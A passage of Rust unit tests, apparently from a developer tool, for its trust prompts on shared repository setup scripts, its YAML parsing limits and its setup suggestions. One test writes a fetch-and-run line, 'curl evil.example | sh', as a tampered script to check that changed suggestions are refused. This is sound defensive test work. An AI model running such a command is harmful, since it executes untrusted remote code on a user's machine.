        assert_eq!(trust_ask(&store, &root, "archive", "echo bye").unwrap().map(|a| a.changed), Some(false), "each script is approved on its own");
        assert_eq!(fingerprint("a\r\nb"), fingerprint("a\nb"), "CRLF line ends are the same script");
        assert_ne!(fingerprint("a"), fingerprint("b"));
        trust_grant(&store, &root, "issue", "work {{issue}}", true).unwrap();
        for (kind, script) in [("setup", "anything new"), ("archive", "rm -rf build"), ("issue", "other")] {
            assert_eq!(trust_ask(&store, &root, kind, script).unwrap(), None, "always trust covers the whole kolux.yaml");
        }
        let _ = std::fs::remove_dir_all(dir);
        let _ = std::fs::remove_dir_all(root);
    }

    #[test]
    fn row887_a_trust_record_from_a_newer_build_keeps_its_unknown_fields_through_a_grant() {
        let (store, dir, root) = trust_store();
        let key = format!("{TRUST_PREFIX}{}", trust_project(&store, &root).unwrap().id);
        store.set(&key, r#"{"all":false,"scripts":{"archive":"abc"},"future":{"a":[1,2]}}"#).unwrap();
        trust_grant(&store, &root, "setup", "echo shared", false).unwrap();
        let saved: serde_json::Value = serde_json::from_str(&store.get(&key).unwrap().unwrap()).unwrap();
        assert_eq!(saved["future"], serde_json::json!({ "a": [1, 2] }), "the unknown field survives the save");
        assert_eq!(saved["scripts"]["archive"], "abc", "the earlier approval is kept");
        assert!(saved["scripts"]["setup"].is_string());
        assert!(crate::orchestration::kept::asides(&store, &key).is_empty(), "a readable newer record is not kept aside");
        let _ = std::fs::remove_dir_all(dir);
        let _ = std::fs::remove_dir_all(root);
    }

    #[test]
    fn row887_a_trust_blob_of_the_wrong_type_is_kept_aside_and_never_read_as_an_empty_record() {
        for blob in ["[]", "\"x\"", "7", "[1,2]", "true"] {
            let (store, dir, root) = trust_store();
            let key = format!("{TRUST_PREFIX}{}", trust_project(&store, &root).unwrap().id);
            store.set(&key, blob).unwrap();
            trust_grant(&store, &root, "setup", "echo shared", false).unwrap();
            assert_eq!(crate::orchestration::kept::asides(&store, &key), vec![blob.to_string()], "{blob}: a byte-identical copy is kept");
            assert_eq!(trust_ask(&store, &root, "setup", "echo shared").unwrap(), None, "{blob}: the grant started a fresh record");
            let _ = std::fs::remove_dir_all(dir);
            let _ = std::fs::remove_dir_all(root);
        }
    }

    #[test]
    fn safe025_removing_and_adding_a_repository_again_forgets_its_trust() {
        let (store, dir, root) = trust_store();
        trust_grant(&store, &root, "setup", "echo shared", true).unwrap();
        assert_eq!(trust_ask(&store, &root, "setup", "echo shared").unwrap(), None);
        store.set("projects", "[]").unwrap();
        assert!(trust_ask(&store, &root, "setup", "echo shared").is_err(), "a removed repository is trusted for nothing");
        std::thread::sleep(std::time::Duration::from_millis(5));
        crate::projects::register_project(&store, (root.clone(), root.clone())).unwrap();
        assert!(trust_ask(&store, &root, "setup", "echo shared").unwrap().is_some(), "added again, it asks again");
        let _ = std::fs::remove_dir_all(dir);
        let _ = std::fs::remove_dir_all(root);
    }

    #[test]
    fn t721_stop_trusting_shows_on_the_page_and_asks_again() {
        let (store, dir, root) = trust_store();
        let page = |s: &crate::state::Store| {
            let r = repo_setup(s, &root, (None, None));
            (r.trusted_all, r.trusted)
        };
        assert_eq!(page(&store), (false, vec![]), "nothing trusted yet");
        trust_grant(&store, &root, "archive", "echo bye", false).unwrap();
        trust_grant(&store, &root, "setup", "echo shared", true).unwrap();
        assert_eq!(page(&store), (true, vec!["archive".to_string(), "setup".to_string()]), "Always trust and each approved script show");
        assert_eq!(trust_ask(&store, &root, "issue", "anything").unwrap(), None);
        trust_clear(&store, &root).unwrap();
        assert_eq!(page(&store), (false, vec![]), "Stop trusting forgets it all");
        for (kind, script) in [("setup", "echo shared"), ("archive", "echo bye"), ("issue", "anything"), ("tabs", "pnpm dev")] {
            assert_eq!(trust_ask(&store, &root, kind, script).unwrap().map(|a| a.changed), Some(false), "{kind} asks again, as new");
        }
        trust_grant(&store, &root, "setup", "echo shared", false).unwrap();
        assert_eq!(trust_ask(&store, &root, "setup", "echo shared").unwrap(), None, "and can be trusted again");
        store.set("projects", "[]").unwrap();
        assert!(trust_clear(&store, &root).is_err(), "not a project: nothing to clear, and it says so");
        let _ = std::fs::remove_dir_all(dir);
        let _ = std::fs::remove_dir_all(root);
    }

    fn tab(title: Option<&str>, color: Option<&str>, command: Option<&str>) -> SharedTab {
        SharedTab { title: title.map(Into::into), color: color.map(Into::into), command: command.map(Into::into) }
    }

    #[test]
    fn proj034_default_tabs_read_block_and_one_line_entries_trimmed() {
        let y = "scripts:\n  setup: pnpm i\ndefaultTabs:\n  - title:   Dev  \n    color: \"#0af\"\n    command: pnpm dev # watch\n  - { title: Logs, command: \"tail -f a, b\", color: '#A1B2C3' }\n  - command: |\n      echo one\n      echo two\n  - title: Plain\nissueCommand: work\n";
        assert_eq!(
            default_tabs(y).unwrap(),
            vec![tab(Some("Dev"), Some("#0af"), Some("pnpm dev")), tab(Some("Logs"), Some("#A1B2C3"), Some("tail -f a, b")), tab(None, None, Some("echo one\necho two")), tab(Some("Plain"), None, None)]
        );
        assert_eq!(top_entry(y, "issueCommand").as_deref(), Some("work"), "the key after the list still reads");
        assert_eq!(default_tabs("defaultTabs:\n- title: A\n  command: ls\n").unwrap(), vec![tab(Some("A"), None, Some("ls"))], "a list at the key's own indent");
        assert_eq!(default_tabs("defaultTabs: []\n").unwrap(), vec![]);
        assert_eq!(default_tabs("scripts:\n  setup: x\n").unwrap(), vec![], "no key, no tabs");
    }

    #[test]
    fn proj034_an_empty_file_means_no_shared_settings() {
        for y in ["", "\n\n", "   \r\n# only a comment\n", "\u{feff}"] {
            assert_eq!(default_tabs(y).unwrap(), vec![]);
            assert_eq!(setup_script(y), None);
            assert_eq!(scripts_entry(y, "archive"), None);
            assert_eq!(top_entry(y, "issueCommand"), None);
        }
        let root = tree(&[("kolux.yaml", b"")]);
        let p = root.to_string_lossy().into_owned();
        let out = default_tabs_run(&p, &p, &|_, _| panic!("nothing to ask")).unwrap();
        assert_eq!(out, DefaultTabs { tabs: vec![], ask: None, refused: None });
        assert_eq!(shared_script("tabs", &root, &root, None, None), None);
        let _ = std::fs::remove_dir_all(root);
    }

    #[test]
    fn proj034_limits_drop_fields_lists_and_refuse_big_or_alias_heavy_files() {
        let mut y = String::from("defaultTabs:\n  - color: red\n  - title: \"x\"\n    color: \"#12\"\n  - title: ok\n    color: \"#GGG\"\n");
        assert_eq!(default_tabs(&y).unwrap(), vec![tab(Some("x"), None, None), tab(Some("ok"), None, None)], "an entry with nothing left is dropped, a bad colour ignored");
        y = format!("defaultTabs:\n  - title: {}\n    command: ls\n  - command: \"{}\"\n", "t".repeat(61), "c".repeat(2001));
        assert_eq!(default_tabs(&y).unwrap(), vec![tab(None, None, Some("ls"))], "an over-long field is dropped");
        y = String::from("defaultTabs:\n");
        for i in 0..20 {
            y.push_str(&format!("  - title: t{i}\n"));
        }
        let tabs = default_tabs(&y).unwrap();
        assert_eq!((tabs.len(), tabs[11].title.as_deref()), (12, Some("t11")), "beyond 12 tabs are dropped");
        let big = format!("defaultTabs:\n  - title: a\n# {}\n", "x".repeat(64 * 1024));
        assert!(default_tabs(&big).unwrap_err().contains("larger than 64 KB"));
        let bomb = format!("base: &b ls\ndefaultTabs:\n{}", "  - command: *b\n".repeat(17));
        assert!(default_tabs(&bomb).unwrap_err().contains("too many aliases"));
        let few = "base: &b ls\ndefaultTabs:\n  - command: *b\n  - title: T\n    command: &c ls -l\n";
        assert_eq!(default_tabs(few).unwrap(), vec![tab(Some("T"), None, Some("ls -l"))], "an alias is never expanded; an anchor's value is kept");
    }

    #[test]
    fn proj034_tab_commands_ask_once_and_a_changed_command_asks_again() {
        let (store, dir, root) = trust_store();
        let yaml = |cmd: &str| format!("defaultTabs:\n  - title: Dev\n    command: {cmd}\n  - title: Notes\n");
        std::fs::write(root.join("kolux.yaml"), yaml("pnpm dev")).unwrap();
        let p = root.to_string_lossy().into_owned();
        let ask = |r: &Path, t: &str| trust_ask(&store, r, "tabs", t);
        let first = default_tabs_run(&p, &p, &ask).unwrap();
        let q = first.ask.clone().expect("the first time it asks");
        assert_eq!((q.kind.as_str(), q.script.as_str(), q.changed), ("tabs", "pnpm dev", false));
        assert_eq!(first.tabs, vec![tab(Some("Dev"), None, None), tab(Some("Notes"), None, None)], "no command runs before the answer");
        assert_eq!(shared_script("tabs", &root, &root, None, None).as_deref(), Some("pnpm dev"), "the prompt shows exactly the commands");
        trust_grant(&store, &root, "tabs", &q.script, false).unwrap();
        let second = default_tabs_run(&p, &p, &ask).unwrap();
        assert_eq!((second.ask, second.tabs[0].command.as_deref()), (None, Some("pnpm dev")), "trusted: the command comes with the tab");
        std::fs::write(root.join("kolux.yaml"), yaml("pnpm dev --host")).unwrap();
        let third = default_tabs_run(&p, &p, &ask).unwrap();
        assert_eq!(third.ask.map(|a| a.changed), Some(true), "a changed command asks again");
        assert_eq!(third.tabs[0].command, None);
        std::fs::write(root.join("kolux.yaml"), "defaultTabs:\n  - title: Only\n").unwrap();
        assert_eq!(default_tabs_run(&p, &p, &|_, _| panic!("no command, no question")).unwrap().tabs, vec![tab(Some("Only"), None, None)]);
        let stranger = tree(&[("kolux.yaml", b"defaultTabs:\n  - command: ls\n")]);
        let sp = stranger.to_string_lossy().into_owned();
        assert!(default_tabs_run(&sp, &sp, &ask).unwrap_err().contains("not one of your projects"), "trust that cannot be checked runs nothing");
        std::fs::write(stranger.join("kolux.yaml"), format!("# {}", "x".repeat(70 * 1024))).unwrap();
        assert!(default_tabs_run(&sp, &sp, &ask).unwrap().refused.unwrap().contains("larger than 64 KB"), "a too-big file is refused before it is parsed");
        for d in [dir, root, stranger] {
            let _ = std::fs::remove_dir_all(d);
        }
    }

    #[test]
    fn proj034_the_tabs_kind_is_a_known_script_and_covered_by_always_trust() {
        let (store, dir, root) = trust_store();
        assert!(trust_ask(&store, &root, "tabs", "ls").unwrap().is_some());
        trust_grant(&store, &root, "issue", "work {{issue}}", true).unwrap();
        assert_eq!(trust_ask(&store, &root, "tabs", "anything").unwrap(), None);
        assert!(trust_ask(&store, &root, "vm", "x").is_err());
        let _ = std::fs::remove_dir_all(dir);
        let _ = std::fs::remove_dir_all(root);
    }

    #[test]
    fn safe025_when_trust_cannot_be_checked_nothing_runs() {
        let (store, dir, root) = trust_store();
        let stranger = tree(&[]);
        assert!(trust_ask(&store, &stranger, "setup", "x").unwrap_err().contains("not one of your projects"));
        assert!(trust_grant(&store, &stranger, "setup", "x", true).is_err());
        assert!(trust_ask(&store, &root, "vm", "x").is_err(), "only the known scripts");
        let id = crate::projects::load_projects(&store)[0].id.clone();
        store.set(&format!("{TRUST_PREFIX}{id}"), "{not json").unwrap();
        assert!(trust_ask(&store, &root, "setup", "echo shared").unwrap_err().contains("could not read"), "a broken record runs nothing");
        trust_grant(&store, &root, "setup", "echo shared", false).unwrap();
        assert_eq!(trust_ask(&store, &root, "setup", "echo shared").unwrap(), None, "approving again replaces the broken record");
        for d in [dir, root, stranger] {
            let _ = std::fs::remove_dir_all(d);
        }
    }

    #[test]
    fn safe025_the_runners_refuse_an_untrusted_shared_script_and_never_ask_for_the_users_own() {
        let (store, dir, root) = trust_store();
        let store = std::sync::Mutex::new(store);
        let asked = std::cell::RefCell::new(Vec::new());
        let gate = |r: &Path, kind: &str, script: &str| {
            asked.borrow_mut().push((kind.to_string(), script.to_string()));
            require_trust(&store, r, kind, script)
        };
        let p = root.to_string_lossy().into_owned();
        let err = setup_for(&p, None, None, &gate).unwrap_err();
        assert_eq!(err, "The setup script in kolux.yaml did not run: this repository's scripts are not trusted yet");
        assert_eq!(setup_for(&p, Some("echo mine".into()), None, &gate).unwrap().unwrap().script, "echo mine", "a local script never asks");
        assert_eq!(asked.borrow().len(), 1);
        trust_grant(&store.lock().unwrap(), &root, "setup", "echo shared", false).unwrap();
        assert_eq!(setup_for(&p, None, None, &gate).unwrap().unwrap().script, "echo shared", "once trusted it runs");
        std::fs::write(root.join("kolux.yaml"), "scripts:\n  setup: echo changed\nissueCommand: work {{issue}}\n").unwrap();
        assert!(setup_for(&p, None, None, &gate).unwrap_err().ends_with("it changed since you trusted it"));
        crate::git::run(&["init", "-q"], Some(&root)).unwrap();
        assert!(issue_run(&p, &p, 12, "https://github.com/o/r/issues/12", &gate).unwrap_err().starts_with("The issue command in kolux.yaml did not run"));
        assert_eq!(asked.borrow().last().unwrap(), &("issue".to_string(), "work {{issue}}".to_string()));
        std::fs::create_dir_all(root.join(".kolux")).unwrap();
        std::fs::write(root.join(ISSUE_OVERRIDE), "mine {{issue}}\n").unwrap();
        let n = asked.borrow().len();
        assert!(!issue_run(&p, &p, 12, "https://github.com/o/r/issues/12", &gate).unwrap().unwrap().shared, "the user's own override never asks");
        assert_eq!(asked.borrow().len(), n);
        let _ = std::fs::remove_dir_all(dir);
        let _ = std::fs::remove_dir_all(root);
    }

    #[test]
    fn stat056_the_prompt_lists_exactly_the_shared_script_that_would_run() {
        let root = tree(&[("kolux.yaml", b"scripts:\n  setup: echo shared\n  archive: echo bye\nissueCommand: work {{issue}}\n")]);
        crate::git::run(&["init", "-q"], Some(&root)).unwrap();
        assert_eq!(shared_script("setup", &root, &root, None, None).as_deref(), Some("echo shared"));
        assert_eq!(shared_script("setup", &root, &root, Some("echo mine"), None), None, "the user's own setup wins and needs no trust");
        assert_eq!(shared_script("setup", &root, &root, Some("echo mine"), Some("shared")).as_deref(), Some("echo shared"));
        assert_eq!(shared_script("archive", &root, &root, None, None).as_deref(), Some("echo bye"));
        assert_eq!(shared_script("issue", &root, &root, None, None).as_deref(), Some("work {{issue}}"));
        assert_eq!(shared_script("vm", &root, &root, None, None), None);
        let _ = std::fs::remove_dir_all(root);
    }

    #[test]
    fn proj035_nothing_is_offered_while_a_setup_script_is_in_effect() {
        let pkg: &[u8] = br#"{"packageManager":"pnpm@9.1.0"}"#;
        let shared = tree(&[("package.json", pkg), ("kolux.yaml", b"scripts:\n  setup: make\n")]);
        assert_eq!(suggest(&shared, None, None), SetupSuggestion::None, "kolux.yaml has one");
        let bare = tree(&[("package.json", pkg)]);
        assert_eq!(suggest(&bare, Some("make"), None), SetupSuggestion::None, "a local one is kept");
        assert_eq!(suggest(&tree(&[("README.md", b"x")]), None, None), SetupSuggestion::None, "nothing to suggest");
        for d in [shared, bare] {
            let _ = std::fs::remove_dir_all(d);
        }
    }

    #[test]
    fn proj035_the_install_command_is_the_declared_package_managers() {
        let ask = |files: &[(&str, &[u8])]| {
            let d = tree(files);
            let s = suggest(&d, None, None);
            let _ = std::fs::remove_dir_all(d);
            s
        };
        let install = |c: &str, m: &str| SetupSuggestion::Install { command: c.into(), manager: m.into() };
        assert_eq!(ask(&[("package.json", br#"{"packageManager":"pnpm@9.1.0"}"#)]), install("pnpm install", "pnpm"));
        assert_eq!(ask(&[("package.json", br#"{"packageManager":"yarn@4.0.0+sha1.abc"}"#), ("package-lock.json", b"{}")]), install("yarn install", "yarn"), "the declaration beats a lock file");
        assert_eq!(ask(&[("package.json", b"{}"), ("bun.lockb", b"x")]), install("bun install", "bun"));
        assert_eq!(ask(&[("package.json", br#"{"packageManager":"rush@1"}"#), ("package-lock.json", b"{}")]), install("npm install", "npm"), "an unknown manager falls back to the lock file");
        assert_eq!(ask(&[("package.json", b"{}")]), SetupSuggestion::None, "nothing declared, nothing guessed");
        assert_eq!(ask(&[("package.json", b"not json"), ("pnpm-lock.yaml", b"x")]), install("pnpm install", "pnpm"));
    }

    #[test]
    fn proj035_another_tools_setup_is_offered_with_the_fields_that_cannot_come_along() {
        let d = tree(&[("package.json", br#"{"packageManager":"pnpm@9"}"#), ("conductor.json", br#"{"scripts":{"setup":"npm ci","run":"npm start","archive":"rm -rf x"},"env":{"A":"1"}}"#)]);
        let got = suggest(&d, None, None);
        assert_eq!(got, SetupSuggestion::Import { file: "conductor.json".into(), setup: "npm ci".into(), skipped: vec!["scripts.run".into(), "env".into(), "teardown (a local setup has no archive script)".into()] }, "the import comes before the install command");
        let c = tree(&[(".codex/environments/environment.toml", b"[setup]\nscript = \"make\"\nshell = \"bash\"\n[actions]\nx = 1\n")]);
        match suggest(&c, None, None) {
            SetupSuggestion::Import { setup, skipped, .. } => {
                assert_eq!(setup, "make");
                assert_eq!(skipped, ["setup.shell", "actions"]);
            }
            other => panic!("{other:?}"),
        }
        for d in [d, c] {
            let _ = std::fs::remove_dir_all(d);
        }
    }

    #[test]
    fn proj035_an_unreadable_kolux_yaml_is_an_error_that_clears_once_it_is_fixed() {
        let d = tree(&[("kolux.yaml", &[0xff, 0xfe, 0x00][..]), ("package.json", br#"{"packageManager":"npm@10"}"#)]);
        match suggest(&d, None, None) {
            SetupSuggestion::Error { message } => assert!(message.starts_with("kolux.yaml could not be read"), "{message}"),
            other => panic!("{other:?}"),
        }
        std::fs::write(d.join("kolux.yaml"), "worktree:\n  x: 1\n").unwrap();
        assert!(matches!(suggest(&d, None, None), SetupSuggestion::Install { .. }), "recovers once the file is fixed");
        let _ = std::fs::remove_dir_all(d);
    }

    #[test]
    fn proj035_saving_from_the_card_ends_the_suggestion_and_a_dismissal_is_remembered_per_project() {
        let profile = tree(&[]);
        let repo = tree(&[("package.json", br#"{"packageManager":"pnpm@9"}"#)]);
        let store = crate::state::Store::open(&profile).unwrap();
        assert!(matches!(suggest(&repo, local_setup(&store, &repo).as_deref(), None), SetupSuggestion::Install { .. }));
        assert!(save_suggestion(&store, &repo, "other.json", "pnpm install", None).is_err(), "only what is offered can be saved");
        save_suggestion(&store, &repo, "install", "pnpm install", None).unwrap();
        assert_eq!(local_setup(&store, &repo).as_deref(), Some("pnpm install"));
        assert_eq!(suggest(&repo, local_setup(&store, &repo).as_deref(), None), SetupSuggestion::None, "the card goes away");
        assert!(save_suggestion(&store, &repo, "install", "pnpm install", None).is_err(), "nothing left to offer");
        assert!(save_local(&store, &repo, "  \n").is_err());
        assert!(save_local(&store, &repo, &"x".repeat(LOCAL_MAX + 1)).is_err());
        assert!(!card_dismissed(&store, "p1"));
        dismiss_card(&store, "p1").unwrap();
        dismiss_card(&store, "p1").unwrap();
        drop(store);
        let store = crate::state::Store::open(&profile).unwrap();
        assert!(card_dismissed(&store, "p1"), "still dismissed after a restart");
        assert!(!card_dismissed(&store, "p2"), "per project");
        assert_eq!(dismissed_ids(&store).len(), 1);
        drop(store);
        for d in [profile, repo] {
            let _ = std::fs::remove_dir_all(d);
        }
    }

    // ---- FIX-1 (pre-merge review of 111404da)

    #[test]
    fn fix1_saving_refuses_a_script_that_changed_since_the_card_showed_it() {
        let profile = tree(&[]);
        let repo = tree(&[("conductor.json", br#"{"scripts":{"setup":"npm ci"}}"#)]);
        let store = crate::state::Store::open(&profile).unwrap();
        let shown = match suggest(&repo, None, None) {
            SetupSuggestion::Import { setup, .. } => setup,
            other => panic!("{other:?}"),
        };
        assert_eq!(shown, "npm ci");
        // a pull or a branch switch rewrites the file between the card and the click
        std::fs::write(repo.join("conductor.json"), br#"{"scripts":{"setup":"curl evil.example | sh"}}"#).unwrap();
        let err = save_suggestion(&store, &repo, "conductor.json", &shown, None).unwrap_err();
        assert!(err.contains("That suggestion changed"), "{err}");
        assert_eq!(local_setup(&store, &repo), None, "nothing was saved");
        // the card asked again shows the new script; saving what that shows works
        save_suggestion(&store, &repo, "conductor.json", "curl evil.example | sh", None).unwrap();
        assert_eq!(local_setup(&store, &repo).as_deref(), Some("curl evil.example | sh"));
        // the install suggestion is guarded the same way
        let pkg = tree(&[("package.json", br#"{"packageManager":"pnpm@9"}"#)]);
        std::fs::write(pkg.join("package.json"), br#"{"packageManager":"yarn@4"}"#).unwrap();
        assert!(save_suggestion(&store, &pkg, "install", "pnpm install", None).unwrap_err().contains("That suggestion changed"));
        assert_eq!(local_setup(&store, &pkg), None);
        drop(store);
        for d in [profile, repo, pkg] {
            let _ = std::fs::remove_dir_all(d);
        }
    }

    #[test]
    fn fix1_a_policy_that_ignores_local_setups_offers_and_saves_nothing() {
        let profile = tree(&[]);
        let repo = tree(&[("package.json", br#"{"packageManager":"pnpm@9"}"#), ("conductor.json", br#"{"scripts":{"setup":"npm ci"}}"#)]);
        let store = crate::state::Store::open(&profile).unwrap();
        for p in ["shared", "shared-first"] {
            assert_eq!(suggest(&repo, None, Some(p)), SetupSuggestion::None, "{p}: a saved local setup would never run");
            assert!(save_suggestion(&store, &repo, "conductor.json", "npm ci", Some(p)).unwrap_err().contains("no longer offered"));
        }
        assert_eq!(local_setup(&store, &repo), None, "nothing saved under the shared policy");
        assert!(matches!(suggest(&repo, None, None), SetupSuggestion::Import { .. }), "the default policy offers it");
        assert!(matches!(suggest(&repo, None, Some("local")), SetupSuggestion::Import { .. }));
        // an unreadable kolux.yaml is still reported: the shared file is what the policy would use
        std::fs::write(repo.join("kolux.yaml"), [0xffu8, 0xfe]).unwrap();
        assert!(matches!(suggest(&repo, None, Some("shared")), SetupSuggestion::Error { .. }));
        drop(store);
        for d in [profile, repo] {
            let _ = std::fs::remove_dir_all(d);
        }
    }

    #[test]
    fn fix1_the_suggestion_commands_and_the_runner_read_one_policy() {
        let profile = tree(&[]);
        let store = crate::state::Store::open(&profile).unwrap();
        assert_eq!(effective_policy(&store, None), None, "none set: the default");
        assert_eq!(effective_policy(&store, Some("shared".into())).as_deref(), Some("shared"), "an argument wins");
        store.set(POLICY_KEY, "shared-first").unwrap();
        assert_eq!(effective_policy(&store, None).as_deref(), Some("shared-first"));
        assert_eq!(effective_policy(&store, Some("local".into())).as_deref(), Some("local"));
        store.set(POLICY_KEY, "  ").unwrap();
        assert_eq!(effective_policy(&store, None), None, "a blank setting is no setting");
        drop(store);
        let _ = std::fs::remove_dir_all(profile);
    }

    #[test]
    fn fix1_suggest_caps_what_it_reads_and_how_long_a_shown_name_is() {
        // package.json and kolux.yaml past the cap are not read (nothing declared / an error to fix)
        let big = vec![b' '; (READ_MAX + 1) as usize];
        let huge_pkg = tree(&[("package.json", &big[..]), ("pnpm-lock.yaml", b"x")]);
        assert_eq!(suggest(&huge_pkg, None, None), SetupSuggestion::None, "an oversized package.json declares nothing");
        let huge_yaml = tree(&[("kolux.yaml", &big[..])]);
        match suggest(&huge_yaml, None, None) {
            SetupSuggestion::Error { message } => assert!(message.contains("larger than"), "{message}"),
            other => panic!("{other:?}"),
        }
        // a field name from an untrusted file is cut before it is shown
        let long = "k".repeat(500);
        let body = format!("{{\"scripts\":{{\"setup\":\"make\"}},\"{long}\":1,\"scripts2\":{{}}}}");
        let d = tree(&[("conductor.json", body.as_bytes())]);
        match suggest(&d, None, None) {
            SetupSuggestion::Import { skipped, .. } => {
                assert!(skipped.iter().all(|n| n.chars().count() <= SHOWN_NAME_MAX), "{skipped:?}");
                assert!(skipped.iter().any(|n| n.starts_with("kkkk") && n.ends_with('…')), "the cut one says it was cut: {skipped:?}");
                assert!(skipped.contains(&"scripts2".to_string()), "short names are untouched");
            }
            other => panic!("{other:?}"),
        }
        for d in [huge_pkg, huge_yaml, d] {
            let _ = std::fs::remove_dir_all(d);
        }
    }

    #[test]
    fn fix1_forgetting_a_project_prunes_its_dismissal_and_its_local_setup() {
        let profile = tree(&[]);
        let (a, b) = (tree(&[]), tree(&[]));
        let store = crate::state::Store::open(&profile).unwrap();
        for (id, d) in [("pa", &a), ("pb", &b)] {
            dismiss_card(&store, id).unwrap();
            save_local(&store, d, "make").unwrap();
        }
        prune_setup(&store, &["pa".to_string()], &[a.to_string_lossy().to_string()]).unwrap();
        assert!(!card_dismissed(&store, "pa") && card_dismissed(&store, "pb"));
        assert_eq!(local_setup(&store, &a), None);
        assert_eq!(local_setup(&store, &b).as_deref(), Some("make"), "another project's setup stays");
        prune_setup(&store, &[], &[]).unwrap();
        drop(store);
        for d in [profile, a, b] {
            let _ = std::fs::remove_dir_all(d);
        }
    }

    #[test]
    fn set033_both_runs_the_own_setup_then_the_shared_one_and_only_the_shared_part_is_trusted() {
        let shared = || Some("echo shared".to_string());
        let both = pick_parts(Some("echo mine\r\n"), shared(), Some("both")).unwrap();
        assert_eq!(both.script, "echo mine && echo shared", "own first, then shared; a failed first ends it");
        let stop = "kolux_setup_status=$?\n[ \"$kolux_setup_status\" -eq 0 ] || exit \"$kolux_setup_status\"";
        assert_eq!(join_both("make\nmake test\n", "pnpm i").unwrap(), format!("make\nmake test\n{stop}\npnpm i"), "longer ones join by lines, with the own part's failure ending the script");
        assert_eq!(join_both("make", "#!/bin/bash -e\npnpm i").unwrap(), format!("#!/bin/bash -e\nmake\n{stop}\npnpm i"), "a POSIX shell the shared script asked for also runs a plain own script");
        assert_eq!(join_both("#!/bin/sh -e\nmake", "#!/bin/sh -e\npnpm i").unwrap(), format!("#!/bin/sh -e\nmake\n{stop}\npnpm i"), "the same interpreter line joins, once");
        assert_eq!(both.shared.as_deref(), Some("echo shared"), "trust covers the shared text alone");
        assert_eq!(pick_parts(Some("echo mine"), None, Some("both")), Some(Picked { script: "echo mine".into(), shared: None, refused: None }), "only the own one exists");
        assert_eq!(pick_parts(None, shared(), Some("both")).unwrap().shared.as_deref(), Some("echo shared"));
        assert_eq!(pick_parts(Some("  "), shared(), Some("both")).unwrap().script, "echo shared", "a blank own script is none");
        assert_eq!(pick_parts(None, None, Some("both")), None);
        // the choices that were there before behave as they did
        assert_eq!(pick_setup(Some("echo mine"), shared(), None), Some(("echo mine".into(), false)));
        assert_eq!(pick_setup(Some("echo mine"), shared(), Some("both")), Some(("echo mine && echo shared".into(), true)));

        // the runner asks about the shared text, never the joined script, and refuses when it is not trusted
        let (store, dir, root) = trust_store();
        let store = std::sync::Mutex::new(store);
        let asked = std::cell::RefCell::new(Vec::new());
        let gate = |r: &Path, kind: &str, script: &str| {
            asked.borrow_mut().push((kind.to_string(), script.to_string()));
            require_trust(&store, r, kind, script)
        };
        let p = root.to_string_lossy().into_owned();
        let err = setup_for(&p, Some("echo mine".into()), Some("both".into()), &gate).unwrap_err();
        assert_eq!(err, "The setup script in kolux.yaml did not run: this repository's scripts are not trusted yet");
        assert_eq!(asked.borrow().as_slice(), [("setup".to_string(), "echo shared".to_string())]);
        // the prompt lists the shared script that would run under both
        assert_eq!(shared_script("setup", &root, &root, Some("echo mine"), Some("both")).as_deref(), Some("echo shared"));
        trust_grant(&store.lock().unwrap(), &root, "setup", "echo shared", false).unwrap();
        assert_eq!(setup_for(&p, Some("echo mine".into()), Some("both".into()), &gate).unwrap().unwrap().script, "echo mine && echo shared", "once trusted both run");
        std::fs::write(root.join("kolux.yaml"), "scripts:\n  setup: echo changed\n").unwrap();
        assert!(setup_for(&p, Some("echo mine".into()), Some("both".into()), &gate).unwrap_err().ends_with("it changed since you trusted it"), "an edited shared script asks again even next to the own one");
        // the own script alone never asks, whatever kolux.yaml holds
        let n = asked.borrow().len();
        assert_eq!(setup_for(&p, Some("echo mine".into()), Some("local".into()), &gate).unwrap().unwrap().script, "echo mine");
        assert_eq!(asked.borrow().len(), n);
        let _ = std::fs::remove_dir_all(dir);
        let _ = std::fs::remove_dir_all(root);
    }

    #[test]
    fn fix1_both_refuses_when_the_two_interpreters_differ_and_runs_nothing_untrusted() {
        let node = "#!/usr/bin/env node\nconsole.log(1)";
        for (local, shared, names) in [
            ("#!/bin/sh\nmake", "#!/bin/bash\npnpm i", ["/bin/sh", "/bin/bash"]),
            ("make", node, ["your setup", "/usr/bin/env node"]),
            ("#!/usr/bin/env node\nbuild()", "pnpm i", ["/usr/bin/env node", "kolux.yaml"]),
            ("#!/usr/bin/env node\nbuild()", "#!/usr/bin/env python3\nprint(1)", ["node", "python3"]),
        ] {
            let why = join_both(local, shared).expect_err(&format!("{local:?} + {shared:?} must not join"));
            for n in names {
                assert!(why.contains(n), "the refusal names {n}: {why}");
            }
            let picked = pick_parts(Some(local), Some(shared.into()), Some("both")).unwrap();
            assert_eq!((picked.script.as_str(), picked.shared.as_deref(), picked.refused.as_deref()), ("", None, Some(why.as_str())), "nothing runs and nothing asks for trust");
        }
        // the same interpreter, or a POSIX shell beside a script that names none, still joins
        assert!(join_both("#!/bin/sh\nmake", "#!/bin/sh\npnpm i").is_ok());
        assert!(join_both("make\nmake test", "#!/bin/sh\npnpm i").is_ok());
        assert!(join_both("make", "pnpm i").is_ok());

        // the runner stops at the refusal before it asks about trust
        let (store, dir, root) = trust_store();
        std::fs::write(root.join("kolux.yaml"), "scripts:\n  setup: |\n    #!/bin/bash\n    pnpm i\n").unwrap();
        let store = std::sync::Mutex::new(store);
        let asked = std::cell::RefCell::new(0);
        let gate = |r: &Path, kind: &str, script: &str| {
            *asked.borrow_mut() += 1;
            require_trust(&store, r, kind, script)
        };
        let err = setup_for(&root.to_string_lossy(), Some("#!/bin/sh\nmake".into()), Some("both".into()), &gate).unwrap_err();
        assert!(err.contains("/bin/sh") && err.contains("/bin/bash"), "the runner says why: {err}");
        assert_eq!(*asked.borrow(), 0, "an untrusted script is not even asked about when nothing would run");
        assert_eq!(shared_script("setup", &root, &root, Some("#!/bin/sh\nmake"), Some("both")), None, "so the trust prompt does not appear for it either");
        let _ = std::fs::remove_dir_all(dir);
        let _ = std::fs::remove_dir_all(root);
    }

    /// A real POSIX sh for tests that run a joined script, or None (the test then says it skipped;
    /// run with --nocapture to see it).
    fn test_sh(test: &str) -> Option<PathBuf> {
        let sh = if cfg!(windows) { find_posix("sh") } else { Some(PathBuf::from("sh")) };
        if sh.is_none() {
            eprintln!("SKIPPED {test}: no POSIX sh on this PC (install Git for Windows); the joined script was not run");
        }
        sh
    }

    #[test]
    fn fix1_a_failed_own_setup_stops_the_shared_one_in_the_joined_script() {
        let Some(sh) = test_sh("fix1_a_failed_own_setup_stops_the_shared_one_in_the_joined_script") else { return };
        let dir = tree(&[]);
        let run = |own: &str| -> bool {
            let _ = std::fs::remove_file(dir.join("shared-ran"));
